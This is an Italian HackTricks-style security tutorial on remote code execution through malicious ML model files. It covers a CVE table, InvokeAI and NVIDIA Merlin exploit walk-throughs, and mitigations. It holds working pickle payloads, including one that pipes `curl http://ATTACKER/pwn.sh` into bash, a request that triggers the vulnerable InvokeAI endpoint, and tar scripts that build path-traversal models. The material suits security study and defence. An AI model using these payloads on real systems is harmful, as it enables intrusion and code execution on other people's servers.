# Modelli RCE

{{#include ../banners/hacktricks-training.md}}

## Caricamento modelli per RCE

I modelli di Machine Learning sono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati nelle macchine degli sviluppatori o nei sistemi di produzione per essere utilizzati. Di norma i modelli non dovrebbero contenere codice malevolo, ma ci sono alcuni casi in cui il modello può essere usato per eseguire codice arbitrario sul sistema come funzionalità intenzionale o a causa di una vulnerabilità nella libreria di caricamento del modello.

Al momento della stesura questi sono alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Strumento**        | **Vulnerabilità (CVE se disponibile)**                                                    | **Vettore RCE**                                                                                                                           | **Riferimenti**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

Inoltre, ci sono alcuni modelli basati su Python pickle come quelli usati da [PyTorch](https://github.com/pytorch/pytorch/security) che possono essere utilizzati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Quindi, qualsiasi modello basato su pickle potrebbe essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` è una popolare interfaccia web open-source per Stable-Diffusion. Le versioni **5.3.1 – 5.4.2** espongono l'endpoint REST `/api/v2/models/install` che permette agli utenti di scaricare e caricare modelli da URL arbitrari.

Internamente l'endpoint alla fine chiama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando il file fornito è un **PyTorch checkpoint (`*.ckpt`)**, `torch.load` esegue una **pickle deserialization**. Poiché il contenuto proviene direttamente da un URL controllato dall'utente, un attaccante può inserire un oggetto maligno con un metodo `__reduce__` personalizzato all'interno del checkpoint; il metodo viene eseguito **during deserialization**, portando a **remote code execution (RCE)** sul server InvokeAI.

Alla vulnerabilità è stato assegnato **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Crea un checkpoint maligno:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Ospita `payload.ckpt` su un server HTTP che controlli (es. `http://ATTACKER/payload.ckpt`).
3. Attiva l'endpoint vulnerabile (nessuna autenticazione richiesta):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando InvokeAI scarica il file chiama `torch.load()` → il gadget `os.system` viene eseguito e l'attaccante ottiene esecuzione di codice nel contesto del processo InvokeAI.

Exploit pronto all'uso: modulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatizza l'intero flusso.

#### Condizioni

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` raggiungibile dall'attaccante  
•  Il processo ha i permessi per eseguire comandi shell

#### Mitigazioni

* Aggiornare a **InvokeAI ≥ 5.4.3** – la patch imposta `scan=True` per impostazione predefinita ed esegue la scansione per malware prima della deserializzazione.  
* Quando carichi checkpoint programmaticamente usa `torch.load(file, weights_only=True)` o il nuovo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).  
* Applicare allow-lists / firme per le sorgenti dei modelli ed eseguire il servizio con privilegi minimi.

> ⚠️ Ricorda che **qualsiasi** formato Python basato su pickle (inclusi molti file `.pt`, `.pkl`, `.ckpt`, `.pth`) è intrinsecamente insicuro da deserializzare da sorgenti non attendibili.

---

Esempio di mitigazione ad hoc se devi mantenere versioni più vecchie di InvokeAI in esecuzione dietro un reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE tramite `torch.load` non sicuro (CVE-2025-23298)

Transformers4Rec di NVIDIA (parte di Merlin) esponeva un loader di checkpoint non sicuro che chiamava direttamente `torch.load()` su percorsi forniti dall'utente. Poiché `torch.load` si basa su Python `pickle`, un checkpoint controllato dall'attaccante può eseguire codice arbitrario tramite un reducer durante la deserializzazione.

Percorso vulnerabile (prima della correzione): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Perché questo porta a RCE: in Python pickle, un oggetto può definire un reducer (`__reduce__`/`__setstate__`) che restituisce un callable e gli argomenti. Il callable viene eseguito durante l'unpickling. Se un tale oggetto è presente in un checkpoint, viene eseguito prima che vengano utilizzati i pesi.

Esempio minimo di checkpoint malevolo:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Vettori di consegna e raggio d'impatto:
- Trojanized checkpoints/models condivisi tramite repo, bucket o artifact registries
- Pipeline di resume/deploy automatizzate che caricano automaticamente i checkpoint
- L'esecuzione avviene all'interno di training/inference workers, spesso con privilegi elevati (es.: root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ha sostituito la chiamata diretta `torch.load()` con un deserializzatore ristretto con allow-list implementato in `transformers4rec/utils/serialization.py`. Il nuovo loader valida tipi/campi e impedisce che callable arbitrari vengano invocati durante il load.

Indicazioni difensive specifiche per i checkpoint PyTorch:
- Do not unpickle untrusted data. Preferire formati non eseguibili come [Safetensors](https://huggingface.co/docs/safetensors/index) o ONNX quando possibile.
- Se devi usare la serializzazione PyTorch, assicurati `weights_only=True` (supportato nelle versioni più recenti di PyTorch) oppure usa un unpickler custom con allow-list simile alla patch di Transformers4Rec.
- Applica provenienza/firme del modello e esegui la deserializzazione in sandbox (seccomp/AppArmor; utente non-root; FS ristretto e no network egress).
- Monitora la presenza di child process inattesi dai servizi ML al momento del load del checkpoint; traccia l'uso di `torch.load()`/`pickle`.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Esempio – creazione di un modello PyTorch malevolo

- Crea il modello:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il modello:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelli per Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), la maggior parte dei formati dei modelli usati dai diversi framework AI sono basati su archivi, solitamente `.zip`. Pertanto, potrebbe essere possibile abusare di questi formati per eseguire path traversal attacks, permettendo di leggere file arbitrari dal sistema in cui il modello viene caricato.

Ad esempio, con il seguente codice puoi creare un modello che creerà un file nella directory `/tmp` quando viene caricato:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oppure, con il codice seguente puoi creare un modello che creerà un symlink alla directory `/tmp` quando viene caricato:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Approfondimento: Keras .keras deserialization and gadget hunting

Per una guida mirata su .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery inside the allowlist, vedi:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Riferimenti

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
